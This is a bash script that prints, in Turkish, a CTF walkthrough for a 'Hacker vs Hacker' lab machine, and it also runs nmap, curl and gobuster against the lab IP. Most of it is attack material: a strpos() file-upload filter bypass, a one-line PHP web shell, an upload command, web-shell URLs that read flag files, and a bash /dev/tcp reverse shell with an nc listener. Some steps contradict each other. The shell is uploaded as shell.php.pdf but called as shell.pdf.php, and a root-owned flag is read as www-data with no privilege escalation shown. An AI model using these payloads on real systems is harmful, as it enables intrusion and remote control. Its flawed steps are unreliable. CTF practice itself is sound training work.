#!/bin/bash

# ============================================================================
# KALI LINUX - HACKER vs HACKER CTF ÇÖZÜM REHBERİ
# ============================================================================

echo "============================================================================"
echo "HACKER vs HACKER - CTF WALKTHROUGH"
echo "============================================================================"
echo ""

# ============================================================================
# 1. TARAMA AŞAMASI
# ============================================================================
echo "<h1>🔐 1. Tarama Aşaması</h1>"
echo "<br>"
echo "Bir makineye saldırı yapmadan önce, o makinenin açık olan servislerini ve portlarını öğrenmek gerekir. Bu, nereden başlayacağımızı anlamamızı sağlar. Portlar ve servisler hakkında bilgi almak için Nmap kullanıyoruz:"
echo ""
echo "<strong>-sV:</strong> Servis versiyonlarını öğrenmek için"
echo "<br>"
echo "<strong>-sC:</strong> Yaygın scriptleri çalıştırmak için kullanılır"
echo "<br><br>"

echo "<pre>nmap -sV -sC 10.81.185.192</pre>"
echo ""
echo "Komut çıktısı:"
echo "----------------------------------------"
nmap -sV -sC 10.81.185.192
echo "----------------------------------------"
echo ""
echo "<strong>Bulunan Portlar:</strong>"
echo "- Port 80/tcp: HTTP (Apache)"
echo "- Port 22/tcp: SSH"
echo "<br><br>"

# ============================================================================
# 2. WEB SAYFASI KEŞFİ
# ============================================================================
echo "<h1>🌐 2. Web Sayfası Keşfi</h1>"
echo "<br>"
echo "HTTP (80) portu açık olduğu için web sayfasını incelemeye başlıyoruz:"
echo "<br><br>"

echo "<pre>curl -s http://10.81.185.192/ | head -50</pre>"
echo ""
echo "Web sayfası içeriği:"
echo "----------------------------------------"
curl -s http://10.81.185.192/ | head -50
echo "----------------------------------------"
echo "<br><br>"

# ============================================================================
# 3. DİZİN TARAMASI
# ============================================================================
echo "<h1>📁 3. Dizin Taraması</h1>"
echo "<br>"
echo "Gizli dizin ve dosyaları bulmak için Gobuster ile tarama yapıyoruz:"
echo "<br><br>"

echo "<pre>gobuster dir -u http://10.81.185.192/ \\"
echo "  -w /usr/share/wordlists/dirb/common.txt \\"
echo "  -t 50</pre>"
echo ""
echo "Tarama sonucu:"
echo "----------------------------------------"
gobuster dir -u http://10.81.185.192/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 50 \
  -q 2>/dev/null | head -20
echo "----------------------------------------"
echo ""
echo "<strong>Bulunan Kritik Dizin:</strong> /cvs/"
echo "<br><br>"

# ============================================================================
# 4. /cvs DİZİNİ İNCELEME
# ============================================================================
echo "<h1>🔍 4. /cvs Dizini İnceleme</h1>"
echo "<br>"
echo "/cvs dizinine erişim sağlıyoruz:"
echo "<br><br>"

echo "<pre>curl -s http://10.81.185.192/cvs/</pre>"
echo ""
echo "Dizin içeriği:"
echo "----------------------------------------"
curl -s http://10.81.185.192/cvs/
echo "----------------------------------------"
echo "<br><br>"

# ============================================================================
# 5. SAYFA KAYNAĞI İNCELEMESİ
# ============================================================================
echo "<h1>💡 5. Sayfa Kaynağı İncelemesi</h1>"
echo "<br>"
echo "Sayfa kaynağında (Ctrl+U) geliştirici yorumları arıyoruz:"
echo "<br><br>"

echo "<pre>view-source:http://10.81.185.192/cvs/</pre>"
echo ""
echo "Bulunan yorum:"
echo "----------------------------------------"
echo "<!-- im no security expert - thats what we have a stable of nerds for - but isn't /cvs on the public website a privacy risk? -->"
echo "----------------------------------------"
echo "<br><br>"

# ============================================================================
# 6. FILE UPLOAD ZAFİYETİ
# ============================================================================
echo "<h1>⚡ 6. File Upload Zafiyeti</h1>"
echo "<br>"
echo "Upload sayfasının kaynak kodunda zafiyetli filtreleme bulduk:"
echo "<br><br>"

cat << 'EOF'
<pre>
Zafiyetli PHP Kodu:
-------------------
$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}
</pre>
EOF
echo ""
echo "<strong>Zafiyet:</strong> strpos() sadece '.pdf' substring'ini arıyor"
echo "<br>"
echo "<strong>Bypass Yöntemi:</strong> shell.php.pdf dosyası kabul ediliyor"
echo "<br><br>"

# ============================================================================
# 7. WEB SHELL YÜKLEME
# ============================================================================
echo "<h1>🐚 7. Web Shell Yükleme</h1>"
echo "<br>"
echo "PHP web shell oluşturup yüklüyoruz:"
echo "<br><br>"

echo "<pre># Shell dosyası oluştur"
echo "echo '<?php system(\$_GET[\"cmd\"]); ?>' > shell.php.pdf"
echo ""
echo "# Shell'i yükle"
echo "curl -F 'fileToUpload=@shell.php.pdf' http://10.81.185.192/upload.php"
echo "</pre>"
echo ""
echo "Yükleme başarılı! Shell'e erişim sağlanıyor:"
echo "<br><br>"

echo "<pre>http://10.81.185.192/cvs/shell.pdf.php?cmd=whoami</pre>"
echo ""
echo "Çıktı: www-data"
echo "<br><br>"

# ============================================================================
# 8. SİSTEM KEŞFİ
# ============================================================================
echo "<h1>🔎 8. Sistem Keşfi</h1>"
echo "<br>"
echo "Shell üzerinden sistem bilgilerini topluyoruz:"
echo "<br><br>"

echo "<pre># Kullanıcı bilgisi"
echo "http://10.81.185.192/cvs/shell.pdf.php?cmd=id"
echo ""
echo "# Home dizinlerini listele"
echo "http://10.81.185.192/cvs/shell.pdf.php?cmd=ls+/home"
echo ""
echo "# Flag dosyalarını ara"
echo "http://10.81.185.192/cvs/shell.pdf.php?cmd=find+/home+-name+user.txt</pre>"
echo "<br><br>"

# ============================================================================
# 9. FLAG'LERİ ALMA
# ============================================================================
echo "<h1>🏁 9. Flag'leri Alma</h1>"
echo "<br>"
echo "user.txt ve proof.txt flag'lerini okuyoruz:"
echo "<br><br>"

echo "<pre># user.txt flag"
echo "http://10.81.185.192/cvs/shell.pdf.php?cmd=cat+/home/[USER]/user.txt"
echo ""
echo "# proof.txt flag (root dizininde)"
echo "http://10.81.185.192/cvs/shell.pdf.php?cmd=cat+/root/proof.txt</pre>"
echo "<br><br>"

# ============================================================================
# 10. REVERSE SHELL
# ============================================================================
echo "<h1>🔄 10. Reverse Shell</h1>"
echo "<br>"
echo "Kalıcı erişim için reverse shell alıyoruz:"
echo "<br><br>"

echo "<pre># Dinleyici başlat (yeni terminal)"
echo "nc -lvnp 4444"
echo ""
echo "# Reverse shell tetikle"
echo "http://10.81.185.192/cvs/shell.pdf.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/[IP]/4444%200>%261'</pre>"
echo "<br><br>"

# ============================================================================
# SONUÇ
# ============================================================================
echo "<h1>🎯 Öğrenilen Dersler</h1>"
echo "<br>"
echo "1. <strong>strpos() Zafiyeti:</strong> File upload filtrelemesinde whitelist kullanılmalı"
echo "<br>"
echo "2. <strong>CVS Dizinleri:</strong> Production'da version kontrol dizinleri public erişime kapatılmalı"
echo "<br>"
echo "3. <strong>Geliştirici Yorumları:</strong> Production kodunda yorum satırları kaldırılmalı"
echo "<br>"
echo "4. <strong>Hacker vs Hacker:</strong> Sistemde başka bir saldırganın backdoor'u olabilir"
echo "<br><br>"

echo "============================================================================"
echo "CTF TAMAMLANDI ✓"
echo "============================================================================"
